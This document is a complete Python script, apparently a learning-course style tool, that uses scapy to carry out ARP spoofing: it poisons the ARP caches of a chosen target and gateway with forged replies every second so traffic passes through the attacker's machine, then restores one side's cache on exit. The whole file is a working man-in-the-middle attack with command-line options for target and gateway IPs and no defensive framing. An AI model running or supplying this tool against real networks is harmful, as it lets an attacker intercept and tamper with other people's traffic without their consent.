 #!/usr/bin/env python3

import scapy.all as scapy
import optparse
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Set the IP target")
    parser.add_option("-g", "--gateway", dest="gateway", help="Set the IP of your gateway")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("\n[-] Please set the target IP, for help type --help")
    elif not options.gateway:
        parser.error("\n[-] Please set the gateway IP, for help type --help")
    return options


options = get_arguments()
packet_sent = 0

try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        packet_sent += 2
        print(f"\r[+] Packets sent: {str(packet_sent)}", end=" ")
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Quitting.")
    restore(options.target, options.gateway)